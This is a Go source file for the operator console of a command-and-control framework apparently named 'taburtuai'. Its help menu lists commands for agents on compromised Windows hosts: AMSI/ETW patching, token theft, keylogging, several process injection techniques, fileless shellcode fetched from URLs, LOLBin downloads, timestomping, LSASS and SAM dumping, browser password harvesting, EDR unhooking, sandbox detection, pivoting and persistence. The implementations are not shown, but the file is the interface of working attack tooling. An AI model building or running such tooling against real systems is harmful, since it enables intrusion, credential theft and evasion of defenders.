package main

import (
	"fmt"
	"os"
	"strings"

	"github.com/chzyer/readline"
	"github.com/spf13/cobra"
)

var consoleCmd = &cobra.Command{
	Use:   "console",
	Short: "Start interactive operator console",
	Long:  "Launch an interactive console. Server is set once — type commands without flags.",
	Run: func(cmd *cobra.Command, args []string) {
		if config.ServerURL == "" {
			printError("--server is required  (or set TABURTUAI_SERVER)")
			os.Exit(1)
		}
		runConsole()
	},
}

func runConsole() {
	// Auto-prepend http:// if scheme is missing
	if !strings.HasPrefix(config.ServerURL, "http://") && !strings.HasPrefix(config.ServerURL, "https://") {
		config.ServerURL = "http://" + config.ServerURL
	}

	display := config.ServerURL
	display = strings.TrimPrefix(display, "http://")
	display = strings.TrimPrefix(display, "https://")

	rl, err := readline.NewEx(&readline.Config{
		Prompt: fmt.Sprintf(
			"\033[36mtaburtuai\033[0m(\033[33m%s\033[0m) \033[2m›\033[0m ", display),
		HistoryFile:            "/tmp/.taburtuai_history",
		HistoryLimit:           500,
		DisableAutoSaveHistory: false,
		InterruptPrompt:        "^C",
		EOFPrompt:              "exit",
	})
	if err != nil {
		printError(fmt.Sprintf("Console init failed: %v", err))
		return
	}
	defer rl.Close()

	fmt.Printf("  %s[*]%s Connected to %s%s%s\n", ColorBlue, ColorReset, ColorGreen, config.ServerURL, ColorReset)
	fmt.Printf("  %s[*]%s Type %shelp%s for commands, %sexit%s to quit.\n\n",
		ColorBlue, ColorReset, ColorCyan, ColorReset, ColorCyan, ColorReset)

	// Silence cobra's own error output — we handle it ourselves
	rootCmd.SilenceErrors = true
	rootCmd.SilenceUsage = true

	for {
		line, err := rl.Readline()
		if err != nil { // EOF or Ctrl+D
			break
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if line == "exit" || line == "quit" {
			break
		}
		if line == "help" || line == "?" {
			printConsoleHelp()
			continue
		}

		tokens := shellTokenize(line)
		if len(tokens) == 0 {
			continue
		}

		// Always inject server (and api-key if set) so PersistentPreRun works
		fullArgs := []string{"--server", config.ServerURL}
		if config.APIKey != "" {
			fullArgs = append(fullArgs, "--api-key", config.APIKey)
		}
		fullArgs = append(fullArgs, tokens...)

		rootCmd.SetArgs(fullArgs)
		if err := rootCmd.Execute(); err != nil {
			consoleError(err.Error(), tokens)
		}
	}

	fmt.Println()
	printInfo("Session ended.")
}

func printConsoleHelp() {
	type entry struct{ cmd, desc string }
	groups := []struct {
		title   string
		entries []entry
	}{
		{"Agents", []entry{
			{"agents list", "list all connected agents"},
			{"agents info <id>", "detailed agent info"},
			{"agents delete <id>", "remove agent record"},
		}},
		{"Execution", []entry{
			{"shell <id>", "interactive shell session"},
			{"cmd <id> \"<cmd>\"", "single command (use quotes for multi-word commands)"},
			{"status <cmd-id>", "check command result"},
			{"history <id>", "agent command history"},
		}},
		{"Files", []entry{
			{"files upload <id> <local> <remote>", "push file to agent"},
			{"files download <id> <remote> <local>", "pull file from agent"},
		}},
		{"Process", []entry{
			{"process list <id>", "list running processes"},
			{"process kill <id> --pid <n>", "kill process by PID"},
			{"process kill <id> --name <x>", "kill process by name"},
			{"process start <id> <exe>", "start process"},
		}},
		{"Persistence", []entry{
			{"persistence setup <id> --method <m> --path <p>", "install persistence"},
			{"persistence remove <id> --method <m> --name <n>", "remove persistence"},
		}},
		{"ADS (Windows NTFS)", []entry{
			{"ads write <id> <local> <target:stream>", "write file into Alternate Data Stream"},
			{"ads read <id> <source:stream> <local>", "read ADS to local file"},
			{"ads exec <id> <path:stream.js>", "execute script from ADS via LOLBin"},
		}},
		{"LOLBin Fetch", []entry{
			{"fetch <id> <url> <remote-path>", "download via certutil (default)"},
			{"fetch <id> <url> <remote-path> --method bitsadmin", "download via BITS (looks like WU)"},
			{"fetch <id> <url> <remote-path> --method curl", "download via curl.exe"},
			{"fetch <id> <url> <remote-path> --method powershell", "download via WebClient"},
		}},
		{"EDR Bypass (Phase 3)", []entry{
			{"bypass amsi <id>", "patch AmsiScanBuffer in agent process"},
			{"bypass amsi <id> --pid <pid>", "patch AMSI in a remote PID"},
			{"bypass etw <id>", "patch EtwEventWrite (suppress ETW telemetry)"},
			{"token list <id>", "enumerate process tokens and integrity levels"},
			{"token steal <id> --pid <pid>", "steal + impersonate token from PID"},
			{"token make <id> --user U --domain D --pass P", "LogonUser token (lateral movement)"},
			{"token revert <id>", "revert to original token (RevertToSelf)"},
			{"token runas <id> <exe> --pid <pid>", "spawn exe under stolen token"},
			{"token runas <id> <exe> --user U --pass P", "spawn exe under LogonUser token"},
		}},
		{"Reconnaissance (Phase 3)", []entry{
			{"screenshot <id> --save /tmp/out.png", "capture desktop as PNG"},
			{"keylog start <id> [--duration N]", "start keylogger (N=0: run until stop)"},
			{"keylog dump <id>", "retrieve buffered keystrokes"},
			{"keylog stop <id>", "stop keylogger + return final buffer"},
			{"keylog clear <id>", "discard buffered keystrokes"},
		}},
		{"Process Injection (Level 2)", []entry{
			{"inject remote <id> --pid <pid> --file <sc.bin>", "CRT injection into remote process"},
			{"inject remote <id> --pid <pid> --file <sc.bin> --method apc", "APC injection (quieter)"},
			{"inject self <id> --file <sc.bin>", "fileless in-memory exec in agent process"},
			{"inject ppid <id> <exe> --ppid-name explorer.exe", "spawn with spoofed parent PID"},
			{"inject ppid <id> <exe> --ppid <pid> --args \"-NoP whoami\"", "spawn with explicit PPID + args"},
		}},
		{"Staged Delivery (Level 2)", []entry{
			{"staged <id> <url>", "fetch shellcode URL → exec in-memory (fileless)"},
			{"staged <id> <url> --method crt --pid <pid>", "fetch → inject into remote PID"},
			{"staged <id> <url> --wait", "wait for execution result"},
		}},
		{"Timestomp (Level 2)", []entry{
			{"timestomp <id> <target>", "copy timestamps from kernel32.dll"},
			{"timestomp <id> <target> --ref explorer.exe", "copy from reference file"},
			{"timestomp <id> <target> --time 2021-06-15T09:00:00Z", "set explicit timestamp"},
		}},
		{"Advanced Injection (Phase 4)", []entry{
			{"hollow <id> --file <sc.bin>", "process hollowing (suspended spawn + RIP patch)"},
			{"hollow <id> --file <sc.bin> --exe notepad.exe", "custom host executable"},
			{"hijack <id> --pid <pid> --file <sc.bin>", "thread hijacking (SuspendThread + RIP patch)"},
			{"stomp <id> --file <sc.bin> --dll xpsservices.dll", "module stomping (.text overwrite)"},
			{"mapinject <id> --file <sc.bin>", "section mapping injection (local, no WriteProcessMemory)"},
			{"mapinject <id> --file <sc.bin> --pid <pid>", "cross-process section mapping injection"},
		}},
		{"Credential Access (Phase 5)", []entry{
			{"creds lsass <id>", "LSASS minidump via MiniDumpWriteDump"},
			{"creds lsass <id> --output C:\\Temp\\ls.dmp", "custom output path"},
			{"creds sam <id>", "save SAM/SYSTEM/SECURITY hives"},
			{"creds browser <id>", "harvest Chrome/Edge/Brave/Firefox passwords"},
			{"creds clipboard <id>", "read current clipboard content"},
		}},
		{"Evasion (Phase 6-8)", []entry{
			{"evasion sleep <id> --duration 30", "obfuscated sleep (XOR memory during idle)"},
			{"evasion unhook <id>", "restore NTDLL .text from disk (remove EDR hooks)"},
			{"evasion hwbp set <id> --addr 0x7FFE1234 --register 0", "install hardware breakpoint (DR0-DR3)"},
			{"evasion hwbp clear <id> --register 0", "remove hardware breakpoint"},
		}},
		{"BOF Execution (Phase 9)", []entry{
			{"bof <id> <file.o>", "execute Beacon Object File in-memory"},
			{"bof <id> <file.o> --args-file args.bin", "BOF with packed arguments"},
		}},
		{"OPSEC (Phase 10)", []entry{
			{"opsec antidebug <id>", "check for debugger presence on agent"},
			{"opsec antivm <id>", "check for VM/sandbox artifacts"},
			{"opsec timegate <id> --start 8 --end 18", "set working-hours window"},
			{"opsec timegate <id> --kill-date 2026-12-31", "set kill date (agent stops after date)"},
		}},
		{"Network & Pivot (Phase 11)", []entry{
			{"netscan <id> -t 10.0.0.0/24 -p 445,3389,22", "TCP port scan via agent"},
			{"netscan <id> -t 10.0.0.1 --banners --wait", "scan with service banner grab"},
			{"arpscan <id> --wait", "ARP scan local subnet"},
			{"socks5 start <id> --addr 127.0.0.1:1080", "start SOCKS5 proxy via agent"},
			{"socks5 stop <id>", "stop SOCKS5 proxy"},
			{"socks5 status <id>", "check proxy status"},
		}},
		{"Registry (Windows)", []entry{
			{"registry read <id> HKLM\\SOFTWARE\\key -V value", "read registry value"},
			{"registry write <id> HKCU\\Software\\key -V val -d data", "write registry value"},
			{"registry delete <id> HKLM\\SOFTWARE\\key -V value", "delete value (or key)"},
			{"registry list <id> HKLM\\SOFTWARE\\key", "list subkeys and values"},
		}},
		{"Queue & Server", []entry{
			{"queue stats", "pending command overview"},
			{"queue clear <id>", "flush pending queue"},
			{"logs [--limit N] [--level L]", "server event logs"},
			{"stats", "server health snapshot"},
		}},
	}

	fmt.Println()
	for _, g := range groups {
		fmt.Printf("  \033[2m%s\033[0m\n", strings.ToUpper(g.title))
		for _, e := range g.entries {
			fmt.Printf("    %s%-48s%s %s%s%s\n",
				ColorCyan, e.cmd, ColorReset,
				"\033[2m", e.desc, "\033[0m")
		}
		fmt.Println()
	}
}

// consoleError prints a contextual error message using the matched cobra command's usage.
func consoleError(errMsg string, tokens []string) {
	matched, _, _ := rootCmd.Find(tokens)
	hasCmd := matched != nil && matched != rootCmd && matched.Use != ""

	switch {
	case strings.Contains(errMsg, "arg(s)") || strings.Contains(errMsg, "argument"):
		if hasCmd {
			useLine := matched.UseLine()
			if idx := strings.Index(useLine, matched.Use); idx >= 0 {
				useLine = useLine[idx:]
			}
			fmt.Printf("%s[!]%s %s\n", ColorYellow, ColorReset, matched.Short)
			fmt.Printf("    \033[2musage:\033[0m  %s\n", useLine)
			fmt.Printf("    \033[2mhelp:\033[0m   %s --help\n\n", tokens[0])
		} else {
			printError(errMsg)
		}

	case strings.Contains(errMsg, "unknown command"):
		cmd := ""
		if len(tokens) > 0 {
			cmd = tokens[0]
		}
		fmt.Printf("%s[!]%s unknown command %s'%s'%s  —  type %shelp%s to list commands\n",
			ColorYellow, ColorReset, ColorRed, cmd, ColorReset, ColorCyan, ColorReset)

	case strings.Contains(errMsg, "unknown flag") || strings.Contains(errMsg, "unknown shorthand"):
		fmt.Printf("%s[!]%s %s", ColorYellow, ColorReset, errMsg)
		if hasCmd {
			fmt.Printf("  —  run '%s --help'\n", tokens[0])
		} else {
			fmt.Println()
		}

	default:
		printError(errMsg)
	}
}

// shellTokenize splits a line into tokens respecting single/double quoted strings.
func shellTokenize(s string) []string {
	var tokens []string
	var cur strings.Builder
	inSingle, inDouble := false, false

	for i := 0; i < len(s); i++ {
		ch := s[i]
		switch {
		case ch == '\'' && !inDouble:
			inSingle = !inSingle
		case ch == '"' && !inSingle:
			inDouble = !inDouble
		case (ch == ' ' || ch == '\t') && !inSingle && !inDouble:
			if cur.Len() > 0 {
				tokens = append(tokens, cur.String())
				cur.Reset()
			}
		default:
			cur.WriteByte(ch)
		}
	}
	if cur.Len() > 0 {
		tokens = append(tokens, cur.String())
	}
	return tokens
}
